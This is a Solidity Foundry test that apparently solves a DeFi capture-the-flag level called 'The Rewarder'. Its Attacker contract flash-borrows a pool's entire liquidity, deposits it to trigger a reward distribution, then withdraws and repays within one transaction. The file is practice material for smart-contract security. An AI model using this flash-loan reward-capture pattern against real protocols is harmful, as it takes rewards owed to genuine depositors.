// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/the-rewarder/TheRewarderLevel.sol";
import "@openzeppelin/contracts//token/ERC20/IERC20.sol";

interface IRewarderPool {
  function distributeRewards() external returns (uint256);
  function deposit(uint256 amount) external;
  function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
  function flashLoan(uint256) external;
}

contract Attacker {
  TheRewarderLevel level;
  IRewarderPool rewarderPool;
  IFlashLoanerPool flashLoanPool;
  IERC20 liquidityToken;

  constructor(TheRewarderLevel _level) {
    level = _level;
    liquidityToken = IERC20(address(level.liquidityToken()));
    rewarderPool = IRewarderPool(address(level.rewarderPool()));
    flashLoanPool = IFlashLoanerPool(address(level.flashLoanPool()));
  }

  function attack() public {
    flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

    // give the funds to beat the level
    liquidityToken.transfer(msg.sender, liquidityToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) public {
    // ?
    liquidityToken.approve(address(rewarderPool), amount);
    rewarderPool.deposit(amount);

    // trigger this to get rewards, and increment the round number
    rewarderPool.distributeRewards();

    // ?
    rewarderPool.withdraw(amount);

    // ?
    liquidityToken.transfer(msg.sender, amount);
  }
}

contract TheRewarderTest is Test {
  TheRewarderLevel level = new TheRewarderLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    // advance time 5 days
    vm.warp(block.timestamp + 5 days);

    Attacker attacker = new Attacker(level);
    attacker.attack();

    level.validate();
  }
}
